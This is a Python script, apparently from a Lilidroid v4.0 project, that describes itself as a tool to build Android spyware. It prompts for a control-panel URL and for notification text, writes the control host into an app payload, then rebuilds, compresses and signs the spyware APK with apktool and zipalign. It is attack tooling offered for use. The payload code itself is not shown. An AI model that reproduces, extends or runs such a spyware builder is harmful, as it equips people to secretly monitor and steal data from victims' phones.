# Author : script1337 [script@hacksec.in]
# Website : https://www.hacksec.in
# Date : Wednesday, 26 January 2022
# Time : 04:04 AM

from ast import Str
from pyfiglet import Figlet
from pydantic import BaseModel
import argparse
import sys
import os
from time import sleep
from Builder import Lilidroid as LilidroidBuilder
from colorama import Fore, Style


class Config(BaseModel):
    apktool: str = os.getcwd() + "/apktool.sh"
    version: str = 'Lilidroid v4.0'
    current_dir: str = os.getcwd()


config = Config()
parser = argparse.ArgumentParser(
    description='Lilidroid v4.0 - A tool to build lilidroid spyware for Android devices.')


parser.add_argument('-v', '--version', help='Version of Lilidroid',
                    action='version', version=config.version)

parser.add_argument(
    '-b', '--build', help='Build Lilidroid with custom name [ex: Lilidroid.py -b lilidroid]', metavar='')


def banner() -> Str:
    f = Figlet(font='slant')
    return f.renderText("Lilidroid v4")


def builder(name: str) -> None:
    try:
        url = input("Control Panel URL : ")
        NotificationText = input("Notification Title : ")
        NotificationContent = input("Notification Content : ")
        NotificationSubText = input("Notification Subtext : ")
    except:
        sys.exit(0)
        print("GoodBye")
    Lilidroid = LilidroidBuilder(name)
    Lilidroid.changeAppname()
    Lilidroid.changeHostname(url)
    Lilidroid.changeNotification(
        NotificationText, NotificationContent, NotificationSubText)
    Lilidroid.print_result("Compiling Lilidroid using apktool")
    os.system("./apktool.sh b Lilidroid_Payload -o " + name + "_uncompressed.apk")
    Lilidroid.print_result("Compiling Lilidroid completed")
    Lilidroid.print_result("Compressing APK Files using zipalign")
    Lilidroid.CompressAPK()
    Lilidroid.print_result("Signing Lilidroid")
    Lilidroid.SingAPK()
    Lilidroid.Clear()
    Lilidroid.print_result("Proccess Completed Successfully")
    Lilidroid.print_result("Saved as " + os.getcwd() + "/" + name + ".apk")


if __name__ == '__main__':
    print(Fore.GREEN + banner())
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    args = parser.parse_args()
    builder(args.build)
